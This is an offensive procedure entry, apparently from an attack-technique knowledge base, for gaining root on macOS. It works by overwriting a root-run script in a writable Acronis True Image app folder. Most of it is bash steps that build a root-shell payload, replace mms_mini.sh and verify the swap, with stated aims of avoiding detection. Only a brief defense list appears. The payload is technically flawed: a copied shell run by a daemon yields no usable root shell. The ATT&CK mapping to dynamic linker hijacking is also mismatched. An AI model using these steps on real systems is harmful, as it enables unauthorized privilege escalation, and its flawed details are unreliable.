---
id: proc-replace-acronis-binary-001
name: Replace-Executable-in-Acronis-App-Folder-with-Malicious-Binary
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:20.037Z'
tactics:
  - '[[Privilege Escalation]]'
techniques:
  - '[[Exploitation for Privilege Escalation]]'
  - '[[Dynamic Linker Hijacking]]'
sub_techniques: []
tags:
  - macos
  - privilege-escalation
  - binary-replacement
commands: []
platforms:
  - macOS
tools: []
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Exploitation for Privilege Escalation]]'
  - '[[Dynamic Linker Hijacking]]'
---

# Replace-Executable-in-Acronis-App-Folder-with-Malicious-Binary

## Summary

This procedure replaces a root-executed binary in the writable Acronis True Image app folder with a malicious script, hijacking the LaunchDaemon's execution to gain root privileges.

## Description

On a macOS system with vulnerable Acronis installation, an admin user overwrites a binary like mms_mini.sh or schedul2 in /Applications/Acronis True Image.app/Contents/MacOS/ with a script that spawns a root shell (e.g., #!/bin/sh). The folder's permissions allow this modification. When the daemon triggers, it executes the malicious code as root, achieving escalation. Prerequisites: Identified target binary from plist examination and admin write access.

## Requirements

1. Writable /Contents/MacOS/ folder
2. Target binary identified (e.g., mms_mini.sh)
3. Text editor or echo for script creation

## Defense

Defensive measures and detection strategies:

- Set immutable flags on app binaries with chflags uchg
- Monitor file changes in /Applications/ using OSQuery or endpoint detection
- Use code signing verification to detect tampering

## Objectives

1. Modify a root binary without detection
2. Ensure malicious code executes as root
3. Maintain stealth until trigger

## Instructions

### Step 1: Create Malicious Script

**Context**: Prepare payload for root shell.

```bash
echo '#!/bin/sh' > /tmp/malicious.sh
echo 'cp /bin/sh /tmp/rootsh; chmod +x /tmp/rootsh; /tmp/rootsh' >> /tmp/malicious.sh
chmod +x /tmp/malicious.sh
```

> Creates executable script to spawn root shell.

### Step 2: Backup and Replace Binary

**Context**: Overwrite the target executable.

Choose a binary like mms_mini.sh and replace:

```bash
cp /Applications/Acronis\ True\ Image.app/Contents/MacOS/mms_mini.sh /tmp/backup_mms_mini.sh
cp /tmp/malicious.sh /Applications/Acronis\ True\ Image.app/Contents/MacOS/mms_mini.sh
```

> Replacement succeeds due to admin write permissions.

### Step 3: Verify Replacement

**Context**: Confirm integrity of modification.

```bash
ls -la /Applications/Acronis\ True\ Image.app/Contents/MacOS/mms_mini.sh
cat /Applications/Acronis\ True\ Image.app/Contents/MacOS/mms_mini.sh
```

> Shows new file with executable permissions and script content.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]] Privilege Escalation

### Techniques

- [[Exploitation for Privilege Escalation]] Exploitation for Privilege Escalation
- [[Dynamic Linker Hijacking]] Dynamic Linker Hijacking

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- macos
- privilege-escalation
- binary-replacement
